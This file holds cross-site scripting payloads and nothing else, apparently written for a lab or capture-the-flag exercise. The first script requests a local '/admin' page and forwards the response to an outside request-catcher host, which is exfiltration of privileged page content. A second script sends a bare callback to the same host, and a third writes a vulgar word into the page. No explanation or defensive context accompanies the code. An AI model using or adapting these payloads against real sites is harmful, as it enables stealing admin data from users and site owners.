<script>
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
         var xhttp1 = new XMLHttpRequest();
         xhttp1.open("GET", "https://hackertees.free.beeceptor.com?"+xhttp.responseText, true);
         xhttp1.send();
         }    
};
xhttp.open("GET", "http://localhost:5000/admin", true);
xhttp.send();
</script>

</

<script>
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "https://hackertees.free.beeceptor.com", true);
xhttp.send();
</script>

<script>document.write('chuj');</script>